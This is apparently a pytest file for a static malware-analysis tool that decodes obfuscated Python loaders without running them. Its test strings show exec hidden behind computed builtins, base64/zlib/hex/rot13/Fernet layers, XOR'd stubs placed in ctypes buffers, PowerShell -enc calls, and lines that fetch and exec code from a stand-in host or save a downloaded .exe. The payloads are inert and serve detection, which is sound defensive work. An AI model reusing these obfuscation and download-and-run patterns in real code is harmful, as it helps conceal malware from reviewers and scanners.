"""Improve languages, phase 2: Python evaluated statically (parsed with ``ast``, never run).

exec layers (lambda + reversed base64 + zlib, base85 + lzma), computed names (``getattr(
__builtins__, 'ex'+'ec')``, ``__import__``), codecs / hex / marshal / Fernet / AES, XOR
comprehensions and in-place loops, ctypes shellcode, downloads and calls that depend on the
victim's machine.
"""

from __future__ import annotations

import base64
import json
import sys
import zlib
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
from test_js_techniques import _analyze, _ms, client  # noqa: E402,F401

from docutracex.resolve import py_eval  # noqa: E402

PE = b"MZ" + b"\x90\x00" * 30 + b" inert DocuTraceX stub " * 4


@pytest.mark.parametrize(("code", "stage"), [
    ("import base64\ngetattr(__builtins__, 'ex'+'ec')(base64.b64decode('cHJpbnQoMSk=').decode())", "print(1)"),
    ("m = __import__('ba'+'se64'); exec(m.b64decode('cHJpbnQoMik='))", "print(2)"),
    ("import codecs\nexec(codecs.decode('cevag(3)', 'rot13'))", "print(3)"),
    ("exec(bytes.fromhex('7072696e74283429').decode())", "print(4)"),
    ("import zlib, base64\n_ = lambda s: zlib.decompress(base64.b64decode(s[::-1]))\nexec(_('%s'))"
     % base64.b64encode(zlib.compress(b"print(5)")).decode()[::-1], "print(5)"),
    ("import binascii\neval(compile(binascii.unhexlify('7072696e74283629'), '<x>', 'exec'))", "print(6)"),
])
def test_exec_forms(code: str, stage: str) -> None:
    s = py_eval.resolve(code)
    assert [st.data for st in s.stages if st.kind == "exec"][:1] == [stage], (s.errors, s.stages)


def test_xor_and_fernet_and_inplace() -> None:
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    s = py_eval.resolve("from cryptography.fernet import Fernet\nexec(Fernet(%r).decrypt(%r))"
                        % (key, Fernet(key).encrypt(b"print('fernet')")))
    assert s.stages[0].data == "print('fernet')" and s.stages[0].recipe[0].startswith("fernet")
    blob = base64.b64encode(bytes(b ^ 0x41 for b in PE)).decode()
    s = py_eval.resolve(f"import base64, ctypes\nsc = bytes([b ^ 0x41 for b in base64.b64decode('{blob}')])\n"
                        "buf = ctypes.create_string_buffer(sc)\n")
    st = s.stages[0]
    assert st.kind == "load" and st.data == PE and "xor(0x41)" in st.recipe
    s = py_eval.resolve(f"import base64\nd = bytearray(base64.b64decode('{base64.b64encode(bytes(b ^ 0x5a for b in PE)).decode()}'))\n"
                        "for i in range(len(d)):\n    d[i] ^= 0x5a\n")
    assert s.stages[0].data == PE and "xor(0x5a)" in s.stages[0].recipe


def test_downloads_and_unresolved() -> None:
    s = py_eval.resolve("import urllib.request, os\n"
                        "exec(urllib.request.urlopen('https://billing-portal.example/p.py').read())\n"
                        "import requests\nr = requests.get('https://billing-portal.example/x.bin')\n"
                        "open('C:/Users/Public/x.exe', 'wb').write(r.content)\n"
                        "getattr(__builtins__, os.environ['FX'])('x')\n")
    d = {x["url"]: x for x in s.downloads}
    assert d["https://billing-portal.example/p.py"]["use"].startswith("runs it as code")
    assert d["https://billing-portal.example/x.bin"]["use"] == "saves it to C:/Users/Public/x.exe"
    assert s.unresolved and "FX" in s.unresolved[0]["depends_on"]


def test_powershell_from_python_is_a_ps1_stage() -> None:
    enc = base64.b64encode("Write-Host 'hola'".encode("utf-16-le")).decode()
    s = py_eval.resolve(f"import subprocess\nsubprocess.run(['powershell', '-nop', '-enc', '{enc}'])")
    st = s.decoded_stages()[0]
    assert st["text"] == "Write-Host 'hola'" and st["ext"] == ".ps1"


def test_py_loader_sample_end_to_end(client) -> None:  # noqa: ANN001,F811
    _cid, res = _analyze(client, "sample_py_loader.py", _ms().py_loader())
    py = json.loads((res / "python.json").read_text())
    r = py["scripts"][0]["resolution"]
    kinds = [(s["kind"], s["depth"]) for s in r["stages"]]
    assert ("exec", 0) in kinds and ("exec", 1) in kinds and ("load", 2) in kinds
    ld = next(s for s in r["stages"] if s["kind"] == "load")
    assert ld["type"] == "pe" and any(x.startswith("aes-256-cbc") for x in ld["recipe"]) and "xor(0x37)" in ld["recipe"]
    assert r["downloads"][0]["url"] == "https://billing-portal.example/inv/py-config.json"
    assert r["unresolved"] and "FX_API" in r["unresolved"][0]["depends_on"]
    rules = {f["rule"] for f in py["findings"]}
    assert {"py_resolved_stages", "python_resolved_download", "python_unresolved_dynamic_call"} <= rules

    def walk(ns):  # noqa: ANN001, ANN202
        for n in ns:
            yield n
            yield from walk(n.get("children") or [])
    tree = list(walk(json.loads((res / "nested.json").read_text())["tree"]))
    assert any(n.get("format") == "PE" for n in tree)          # the "shellcode" reached Nested, under its layers
